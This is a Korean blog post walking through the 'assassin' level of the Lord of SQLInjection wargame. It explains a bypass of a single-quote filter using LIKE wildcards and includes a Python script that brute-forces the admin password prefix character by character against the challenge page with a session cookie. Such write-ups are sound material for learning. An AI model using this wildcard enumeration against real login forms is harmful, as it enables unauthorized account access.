---
layout: single
title: "[Lord of SQLInjection] assassin write-up"
date: 2025-04-25 20:22 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## Lord of SQLInjection (assassin)

### 풀이

이번 문제는 pw 파라미터에 싱글쿼터를 필터링하고 있다. 이를 우회하고 id 값이 admin이면 해결인 것 같다.

![image-20250425222236398](/images/2025-04-25-los-assassin/image-20250425222236398.png)

<br>

pw 파라미터 값이 들어가는 쿼리를 살펴보면 싱글쿼터로 각각 닫혀져 있어 like 연산자에서 싱글쿼터를 굳이 입력하지 않아도 해결 가능할 것 같다. 아 근데 where 조건이 pw였다. like 연산자는 % 문자로 모든 값을 만족시킬 수 있다. 따라서 넣어보면 id가 guest로 나온다.

![image-20250425222630868](/images/2025-04-25-los-assassin/image-20250425222630868.png)

<br>

아래 코드로 string 모듈을 사용해 들어갈 수 있는 모든 문자를 하나씩 앞에 넣어 확인해보면 guest의 password 첫 글자가 9라는거 말고는 Hello admin 문자열이 안나온 걸로 봐서 admin도 첫 글자가 9라는 것을 예상해볼 수 있다.

```python
import requests
import string

password_all = string.digits + string.ascii_letters + string.punctuation
url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"

cookie = {"PHPSESSID": "l4fo5d8u56opaucpiffcbfvver"}

for i in range(0, len(password_all)):
    param = {"pw": f"{password_all[i]}%"}
    r = requests.get(url=url, cookies=cookie, params=param)
    print(r.text.splitlines()[0])
    if "Hello admin" in r.text:
        print(f"{password_all[i]}")
        break
    if "hello guest" in r.text:
        print(f"{password_all[i]}")

```

![image-20250425223906813](/images/2025-04-25-los-assassin/image-20250425223906813.png)

<br>

9를 pw 앞에 넣어 테스트해보면 90이 나오고 또 Hello admin 문자열은 보이지 않는다..

![image-20250425224122784](/images/2025-04-25-los-assassin/image-20250425224122784.png)

<br>

다시 90을 넣고 코드를 돌려보면 admin은 902로 시작한다는 것을 알 수 있고, solve!

![image-20250425224243944](/images/2025-04-25-los-assassin/image-20250425224243944.png)

![image-20250425224312223](/images/2025-04-25-los-assassin/image-20250425224312223.png)